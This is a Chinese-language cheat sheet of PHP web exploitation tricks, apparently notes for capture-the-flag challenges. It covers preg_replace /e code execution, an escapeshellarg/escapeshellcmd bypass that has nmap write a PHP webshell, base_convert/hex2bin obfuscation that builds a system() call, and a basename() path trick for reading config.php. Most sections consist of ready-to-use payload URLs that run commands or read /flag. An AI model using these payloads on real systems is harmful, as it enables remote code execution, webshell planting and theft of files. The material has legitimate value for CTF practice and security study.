## **preg_replace函数代码执行**
preg_replace接收三个参数，$pat是正则表达式为/e时。
第二个参数是代码，第三个参数被匹配，则第二个参数会代码执行。
第三个参数$sub如果${}包裹里面会被代码执行
```
preg_replace($pat,$rep,$sub);

?pat=/abc/e&rep=system('ls')&sub=abc
```


^
正则替换函数，第三个参数代码执行情况：
```
function getFlag(){
    @eval($_GET['cmd']);
}

//将每个get传参的参数和参数值进行匹配
foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}
```



```
如果传参
参数 "/([A-Z])/"; // 匹配大写字母的正则表达式
值 "Hello World"

preg_replace 函数来将字符串中的大写字母转换为小写字母：
这段代码执行后会输出 "hello world"
```
这里的漏洞出在preg_replace /e 模式下。
值用${}包裹后会代码执行。
```
比如我们传入  ?.*={${phpinfo()}}
原句：preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str); 
就变成preg_replace('/(' .* ')/ei','strtolower("\\1")',{${phpinfo()}});

又因为$_GET传入首字母是非法字符时候会把 .（点号）改成下划线，因此得将\.*换成\S*

所以payload：?\S*=${getFlag()}&cmd=system('ls /'); 
${getFlag()}不是{${getFlag()}}
此时getFlag()会被代码执行，调用函数，即可使用cmd。
```
```
如果
`/\{\?([^}]+)\}/e` 这一内容，正则匹配的内容也就是 `{?(任意内容)}` ，
payload： catid={?(phpinfo())}
```

^
## **过滤函数**
```
$host = $_GET['host'];
$host = escapeshellarg($host);
$host = escapeshellcmd($host);
echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
```
利用特性，和namp参数写文件webshell
```
?host=' <?php @eval($_POST["cmd"]);?> -oG test.php '
或直接读
?host=' <?php echo `cat /flag`;?> -oG test.php '
```



^
## **进制转换函数**
```
base_convert(37907361743,10,36) = "hex2bin"

hex2bin(5f 47 45 54) = "_GET"

dechex(1598506324) =  "5f 47 45 54"

_GET = base_convert(37907361743,10,36)(dechex(1598506324))

变量覆盖
/?c=$p=base_convert(37907361743,10,36)(dechex(1598506324));($$p){pi}(($$p){abs})&pi=system&abs=cat /flag
```


^
^
## **basename()场景漏洞**
源代码：
```
if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}
if (isset($_GET['source'])) {
    highlight_file(basename($_SERVER['PHP_SELF']));
}
```
我们要包含高亮config.php
`$_SERVER['PHP_SELF']`会获取我们当前的访问路径，并且PHP在根据URI解析到对应文件后会忽略掉URL中多余的部分，即若访问存在的index.php页面，如下两种UR均会访问到。
```
/index.php
/index.php/dosent_exist.php
```
`basename`可以理解为对传入的参数路径截取最后一段作为返回值，但是该函数发现最后一段为不可见字符时会退取上一层的目录，basename只能转换ASCII码内的字符。即：
```
$var1="/config.php/test"
basename($var1)	=> test
$var2="/config.php/%ff"
basename($var2)	=>	config.php
```
`$_SERVER['PHP_SELF']`提交index.php/config.php时，经过basename过滤后只剩下config.php，需要绕过的只有正则，basename只能转换ASCII码内的字符，通过超过ASCII码范围的字符进行绕过。

接下来就显然了，通过构造URI让其包含`config.php`这个文件名再让`basename`函数截取出来，之后通过请求参数`source`就能显示`config.php`的源码，也就能见到`flag`了。
```
/index.php/config.php/%ff?source
```


